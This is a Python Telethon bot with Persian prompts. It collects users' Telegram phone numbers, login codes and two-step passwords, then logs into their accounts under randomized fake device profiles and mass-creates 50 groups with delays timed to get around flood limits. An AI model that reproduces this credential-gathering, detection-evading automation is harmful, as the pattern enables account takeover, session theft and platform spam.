import asyncio
import os
import random
import time
import logging
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.functions.messages import CreateChatRequest
from dotenv import load_dotenv
# To implement encryption, you would install and import this
# from cryptography.fernet import Fernet

# --- Basic Logging Setup ---
# This will log detailed info to a file and the console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot_activity.log"),
        logging.StreamHandler()
    ]
)

# --- Configuration ---
load_dotenv()
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
# You would store your single encryption key here
# ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY")
# fernet = Fernet(ENCRYPTION_KEY.encode())

if not all([API_ID, API_HASH, BOT_TOKEN]):
    raise ValueError("Missing required environment variables in your .env file.")

API_ID = int(API_ID)

# In-memory storage. For a real app, replace this with database calls.
user_sessions = {}

# --- Helper Functions ---
def create_new_user_client():
    """Creates a Telethon client with randomized device info."""
    session = StringSession()
    device_params = [
        {'device_model': 'iPhone 14 Pro Max', 'system_version': '17.5.1', 'app_version': '10.9.1'},
        {'device_model': 'Samsung Galaxy S24 Ultra', 'system_version': 'SDK 34', 'app_version': '10.9.1'},
        {'device_model': 'Desktop', 'system_version': 'Windows 11', 'app_version': '4.16.8'},
        {'device_model': 'Pixel 8 Pro', 'system_version': 'SDK 34', 'app_version': '10.9.0'}
    ]
    selected_device = random.choice(device_params)
    return TelegramClient(session, API_ID, API_HASH, **selected_device)

async def run_group_creation_worker(event, client):
    """The main background task that creates 50 groups for the logged-in user."""
    await event.reply('✅ **ورود موفقیت‌آمیز بود!**\n\nفرآیند ساخت ۵۰ گروه در پس‌زمینه آغاز شد. این کار ممکن است چندین ساعت طول بکشد.')
    if event.sender_id in user_sessions:
        del user_sessions[event.sender_id] # Replace with DB update
    try:
        user_to_add = '@BotFather'
        for i in range(50):
            group_title = f"Automated Group #{random.randint(1000, 9999)} - {i + 1}"
            try:
                await client(CreateChatRequest(users=[user_to_add], title=group_title))
                logging.info(f"Successfully created group: {group_title} for user {event.sender_id}")
                sleep_duration = random.randint(400, 1000)
                logging.info(f"Waiting for {sleep_duration} seconds...")
                await asyncio.sleep(sleep_duration)
            except errors.FloodWaitError as fwe:
                logging.warning(f"Flood wait for user {event.sender_id}. Sleeping for {fwe.seconds} seconds.")
                await event.sender.send_message(f"⏳ به دلیل محدودیت تلگرام، عملیات به مدت {fwe.seconds / 60:.2f} دقیقه متوقف شد.")
                await asyncio.sleep(fwe.seconds)
            except Exception as e:
                logging.error(f"Could not create group {group_title} for user {event.sender_id}", exc_info=True)
                await event.sender.send_message(f"❌ ساخت گروه به دلیل خطا ناموفق بود: {e}")
                await asyncio.sleep(60)
    finally:
        await event.sender.send_message('🏁 چرخه ساخت گروه‌ها به پایان رسید.')
        await client.disconnect()

# --- Main Application Logic ---
async def main():
    client = TelegramClient('bot_session', API_ID, API_HASH)

    @client.on(events.NewMessage(pattern='/start'))
    async def start(event):
        user_id = event.sender_id
        await event.reply(
            '**خوش آمدید!**\n'
            'این ربات برای ساخت گروه به صورت اتوماتیک است.\n\n'
            'لطفا شماره تلفن تلگرام خود را با فرمت بین‌المللی ارسال کنید (مثال: +989123456789).'
        )
        # For a real app, you would create a record in your database here
        user_sessions[user_id] = {'state': 'awaiting_phone'}
        raise events.StopPropagation

    @client.on(events.NewMessage)
    async def handle_all_messages(event):
        user_id = event.sender_id
        # For a real app, you would fetch the user's state from the database
        if user_id not in user_sessions:
            return
        state = user_sessions[user_id].get('state')
        
        if state == 'awaiting_phone':
            await handle_phone_input(event)
        elif state == 'awaiting_code':
            await handle_code_input(event)
        elif state == 'awaiting_password':
            await handle_password_input(event)

    async def handle_phone_input(event):
        user_id = event.sender_id
        phone = event.text.strip()
        user_client = create_new_user_client()
        # Store client instance in memory; in a real app, you wouldn't store the object itself
        user_sessions[user_id]['client'] = user_client
        try:
            await user_client.connect()
            sent_code = await user_client.send_code_request(phone)
            # Store necessary temp data in memory or DB
            user_sessions[user_id]['phone_code_hash'] = sent_code.phone_code_hash
            await event.reply('یک کد ورود به حساب تلگرام شما ارسال شد. لطفا آن را اینجا ارسال کنید.')
            user_sessions[user_id]['state'] = 'awaiting_code' # Update state in DB
        except Exception as e:
            logging.error(f"Phone input error for user {user_id}: {e}", exc_info=True)
            await event.reply(f'❌ **خطا:** یک مشکل داخلی رخ داده است.')
            del user_sessions[user_id] # Delete record from DB

    async def handle_code_input(event):
        user_id = event.sender_id
        code = event.text.strip()
        user_client = user_sessions[user_id]['client']
        phone_code_hash = user_sessions[user_id].get('phone_code_hash')
        try:
            await user_client.sign_in(event.text.strip(), phone_code_hash=phone_code_hash)
            # Login successful: save encrypted session string to DB
            # session_string = user_client.session.save()
            # encrypted_session = fernet.encrypt(session_string.encode())
            # db.save_session(user_id, encrypted_session)
            asyncio.create_task(run_group_creation_worker(event, user_client))
        except errors.SessionPasswordNeededError:
            await event.reply('حساب شما دارای تایید دو مرحله‌ای است. لطفا رمز عبور خود را ارسال کنید.')
            user_sessions[user_id]['state'] = 'awaiting_password' # Update state in DB
        except Exception as e:
            logging.error(f"Code input error for user {user_id}: {e}", exc_info=True)
            await event.reply(f'❌ **خطا:** یک مشکل داخلی رخ داده است.')
            del user_sessions[user_id] # Delete record from DB

    async def handle_password_input(event):
        user_id = event.sender_id
        user_client = user_sessions[user_id]['client']
        try:
            await user_client.sign_in(password=event.text.strip())
            # Login successful: save encrypted session string to DB
            # session_string = user_client.session.save()
            # encrypted_session = fernet.encrypt(session_string.encode())
            # db.save_session(user_id, encrypted_session)
            asyncio.create_task(run_group_creation_worker(event, user_client))
        except Exception as e:
            logging.error(f"Password input error for user {user_id}: {e}", exc_info=True)
            await event.reply(f'❌ **خطا:** یک مشکل داخلی رخ داده است.')
            del user_sessions[user_id] # Delete record from DB

    # --- Start the Bot ---
    logging.info("Starting bot...")
    await client.start(bot_token=BOT_TOKEN)
    logging.info("Bot service has started successfully.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
